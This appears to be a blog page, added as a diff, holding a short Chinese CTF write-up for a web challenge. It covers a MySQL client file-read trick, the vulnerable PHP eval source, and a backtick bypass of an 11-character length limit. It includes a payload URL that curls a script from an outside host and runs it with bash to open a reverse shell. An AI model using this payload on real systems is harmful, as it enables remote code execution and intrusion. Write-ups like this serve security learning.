@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="提示先连接数据库，看源码发现mysql.php,当时就和队友说这原题（ddctf+护网杯）啊。搭建服务端环境，读取文件。  这里是赛后搭建的环境，没读回来文件，比赛的时候是可以读回来文件的。  我读了很多文件都没有读到提示，以至于比赛结束都没有做出来。 :)其实就是mysql.php.bak里有flag的提示，我试了.mysql.php.swp,.git,.svn,mysql.php~，偏偏没想">
+<meta property="og:type" content="article">
+<meta property="og:title" content="韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行">
+<meta property="og:url" content="https://xiaokou.top/posts/66009cbb/index.html">
+<meta property="og:site_name" content="suanve - Blog">
+<meta property="og:description" content="提示先连接数据库，看源码发现mysql.php,当时就和队友说这原题（ddctf+护网杯）啊。搭建服务端环境，读取文件。  这里是赛后搭建的环境，没读回来文件，比赛的时候是可以读回来文件的。  我读了很多文件都没有读到提示，以至于比赛结束都没有做出来。 :)其实就是mysql.php.bak里有flag的提示，我试了.mysql.php.swp,.git,.svn,mysql.php~，偏偏没想">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https://xiaokou.top/post-images1571659357082.png">
+<meta property="og:image" content="https://xiaokou.top/post-images1571659398256.png">
+<meta property="og:image" content="https://xiaokou.top/post-images1571659956283.png">
+<meta property="og:image" content="https://xiaokou.top/post-images1571659990212.png">
+<meta property="og:image" content="https://xiaokou.top/post-images1571660167893.png">
+<meta property="og:image" content="https://xiaokou.top/post-images1571660284847.png">
+<meta property="og:image" content="https://xiaokou.top/post-images1571666063111.png">
+<meta property="og:image" content="https://xiaokou.top/post-images1571666105628.png">
+<meta property="article:published_time" content="2019-10-21T04:02:00.000Z">
+<meta property="article:modified_time" content="2021-03-10T03:58:53.798Z">
+<meta property="article:author" content="suanve">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="mysql客户端读取">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiaokou.top/post-images1571659357082.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="suanve - Blog" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/other">友链</a></li>
+         
+          <li><a href="https://github.com/suanve?tab=repositories" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/22f253d9/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/d3989207/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xiaokou.top/posts/66009cbb/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xiaokou.top/posts/66009cbb/&text=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xiaokou.top/posts/66009cbb/&is_video=false&description=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行&body=Check out this article: https://xiaokou.top/posts/66009cbb/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xiaokou.top/posts/66009cbb/&name=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xiaokou.top/posts/66009cbb/&t=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">:)</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">suanve</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-10-21T04:02:00.000Z" itemprop="datePublished">2019-10-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/mysql%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%BB%E5%8F%96/" rel="tag">mysql客户端读取</a>, <a class="tag-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <a id="more"></a>
+<p><img src="/post-images1571659357082.png" alt=""><br>提示先连接数据库，看源码发现mysql.php,当时就和队友说这原题（ddctf+护网杯）啊。<br><img src="/post-images1571659398256.png" alt=""><br>搭建服务端环境，读取文件。<br><img src="/post-images1571659956283.png" alt=""></p>
+<blockquote>
+<p>这里是赛后搭建的环境，没读回来文件，比赛的时候是可以读回来文件的。<br><img src="/post-images1571659990212.png" alt=""></p>
+</blockquote>
+<p>我读了很多文件都没有读到提示，以至于比赛结束都没有做出来。</p>
+<h1 id=""><a href="#" class="headerlink" title=":)"></a><strong>:)</strong></h1><p>其实就是mysql.php.bak里有flag的提示，我试了.mysql.php.swp,.git,.svn,mysql.php~，偏偏没想起来mysql.php.bak</p>
+<p>以下为解题过程：</p>
+<p>读取mysql.php.bak 然后 看到提示</p>
+<p><img src="/post-images1571660167893.png" alt=""><br>使用mysql读取漏洞读取/var/www/html/Flag.php<br><img src="/post-images1571660284847.png" alt=""><br>读取到到内容为：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$param = $_REGUEST['param'];</span><br><span class="line">if(</span><br><span class="line">	strlen($param) &lt;= 11 &amp;&amp;</span><br><span class="line">	stripos($param, 'eval') == false &amp;&amp;</span><br><span class="line">	stripos($param, 'assert') == false</span><br><span class="line">){</span><br><span class="line">	eval($param);</span><br><span class="line">}else{</span><br><span class="line">die("error");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>准备反弹shell的命令，放在web上。<br><img src="/post-images1571666063111.png" alt=""><br><a href="http://127.0.0.1/Flag.php?param=\`$_GET[2]\`;&amp;2=curl%20192.168.199.241:808/sh>sh;bash%20sh" target="_blank" rel="noopener">http://127.0.0.1/Flag.php?param=\`$_GET[2]\`;&amp;2=curl%20192.168.199.241:808/sh&gt;sh;bash%20sh</a></p>
+<p>长度限制在11位以内的命令执行，直接反引号绕过。</p>
+<p><img src="/post-images1571666105628.png" alt=""></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/other">友链</a></li>
+         
+          <li><a href="https://github.com/suanve?tab=repositories" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">:)</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xiaokou.top/posts/66009cbb/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xiaokou.top/posts/66009cbb/&text=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xiaokou.top/posts/66009cbb/&is_video=false&description=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行&body=Check out this article: https://xiaokou.top/posts/66009cbb/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xiaokou.top/posts/66009cbb/&title=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xiaokou.top/posts/66009cbb/&name=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xiaokou.top/posts/66009cbb/&t=韩国ctf之旅——web1-mysql文件读取+绕过长度限制命令执行" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    suanve
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/other">友链</a></li>
+         
+          <li><a href="https://github.com/suanve?tab=repositories" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
